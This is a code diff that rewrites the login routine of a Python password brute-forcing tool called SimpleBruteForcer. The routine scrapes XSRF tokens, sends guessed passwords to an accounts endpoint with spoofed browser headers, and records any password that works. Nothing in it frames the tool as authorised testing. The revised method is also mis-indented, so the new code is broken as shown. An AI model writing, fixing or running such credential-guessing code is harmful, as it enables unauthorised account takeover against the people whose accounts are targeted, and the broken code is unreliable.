@@ -71,60 +71,58 @@ class SimpleBruteForcer:
             print(Fore.GREEN + f"[Log Error] Failed to write hit: {e}")
 
     def attempt_login(self, session, password):
-        try:
-            print(Fore.CYAN + f"[🧠] Starting 2-step login for {self.username}...")
+    try:
+        print(Fore.CYAN + f"[🧠] Starting login attempt for {self.username}...")
 
-            # Manually generate base64-encoded ai token
-            ai_token = base64.b64encode(self.username.encode()).decode()
-            print(Fore.GREEN + f"[🔑] Generated AI token from username: {ai_token}")
+        # Re-fetch XSRF token and update headers
+        login_page = session.get(self.url, headers={"User-Agent": "Mozilla/5.0"})
+        soup = BeautifulSoup(login_page.text, 'html.parser')
 
-            xsrf_token = session.cookies.get("xsrf_token")
-            if not xsrf_token:
-                # Try to fetch cookies with a GET
-                session.get(self.url, headers={"User-Agent": "Mozilla/5.0"})
-                xsrf_token = session.cookies.get("xsrf_token")
+        xsrf_token = session.cookies.get("xsrf_token") or soup.find("input", {"name": "xsrf_token"})
+        if hasattr(xsrf_token, 'get'):  # if it's a tag
+            xsrf_token = xsrf_token.get("value")
 
-            if not xsrf_token:
-                print(Fore.YELLOW + "[❌] XSRF token missing")
-                return False
-
-            post_url = f"https://accounts.example.com/accounts/v2/password?ai={ai_token}&continue=%2Faccounts%2Fwelcome"
-            payload = {
-                "password": password,
-                "xsrf_token": xsrf_token,
-                "continue": "/accounts/welcome"
-            }
-
-            headers = {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-                "Referer": self.url,
-                "Origin": "https://accounts.example.com",
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                "Accept-Language": "en-US,en;q=0.9"
-            }
-
-            print(Fore.CYAN + f"[🚪] Attempting login with password: {password}")
-            response = session.post(post_url, data=payload, headers=headers, timeout=10)
-
-            time.sleep(1.5)  # delay to reduce 429 risk
-
-            with open("last_response.html", "w", encoding='utf-8') as f:
-                f.write(response.text)
-
-            if "/accounts/welcome" in response.url or "account-identifier-root" not in response.text:
-                print(Fore.GREEN + f"[✅] Password found: {password}")
-                self.log_hit(self.username, password)
-                self.success_flag.set()
-                return True
-            else:
-                print(Fore.RED + f"[❌] Incorrect: {password}")
-                return False
-
-        except Exception as e:
-            print(Fore.RED + f"[Error] {e}")
+        if not xsrf_token:
+            print(Fore.YELLOW + "[❌] Missing XSRF token, skipping.")
             return False
 
+        # Update login POST URL if needed
+        parsed = urlparse(self.url)
+        post_url = f"{parsed.scheme}://{parsed.netloc}/accounts/v2/password"
+
+        payload = {
+            "username": self.username,
+            "password": password,
+            "xsrf_token": xsrf_token
+        }
+
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+            "Referer": self.url,
+            "Origin": f"{parsed.scheme}://{parsed.netloc}",
+            "Content-Type": "application/x-www-form-urlencoded"
+        }
+
+        print(Fore.YELLOW + f"[🚪] Trying password: {password}")
+        response = session.post(post_url, data=payload, headers=headers, timeout=10)
+
+        with open("last_response.html", "w", encoding='utf-8') as f:
+            f.write(response.text)
+
+        if response.status_code == 200 and ("/welcome" in response.url or "dashboard" in response.text):
+            print(Fore.GREEN + f"[✅] Found working password: {password}")
+            self.log_hit(self.username, password)
+            self.success_flag.set()
+            return True
+        else:
+            print(Fore.RED + f"[❌] Rejected password: {password}")
+            return False
+
+    except Exception as e:
+        print(Fore.RED + f"[Error] Login exception: {e}")
+        return False
+        
+        
     def worker(self):
         while not self.passwords.empty() and not self.success_flag.is_set() and not self.stop_flag.is_set():
             if self.paused.is_set():
